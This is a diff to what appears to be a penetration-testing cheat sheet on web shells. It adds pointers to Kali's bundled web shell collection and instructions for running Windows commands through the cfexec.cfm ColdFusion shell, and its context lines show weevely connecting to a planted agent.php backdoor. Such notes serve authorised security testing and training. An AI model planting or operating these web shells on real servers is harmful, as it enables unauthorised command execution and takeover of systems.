@@ -45,6 +45,12 @@ https://github.com/xl7dev/WebShell
 https://github.com/Qazeer/WebShell
 ```
 
+Kali Linux also comes with a collection of web shell, located in:
+
+```
+/usr/share/webshells
+```
+
 #### JSP
 
 ###### Basic
@@ -135,6 +141,22 @@ Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.
 # Connect to the agent
 ./weevely.py http://<TARGET>/agent.php mypassword
 weevely>
+```
+
+#### CFM
+
+Among others, the ColdFusion Markup Language `cfexec.cfm` web shell, located on
+Kali by default at `/usr/share/webshells/cfm/cfexec.cfm`, can be used to execute
+system commands on a web server supporting the CFM file format.
+
+To execute `CMD` command on `Windows`, the parameters are as follow:
+
+```
+# Path to the cmd binary
+Command: c:\windows\system32\cmd.exe
+
+# Command to execute
+Options: /c <COMMAND>
 ```
 
 ### Reverse Shells
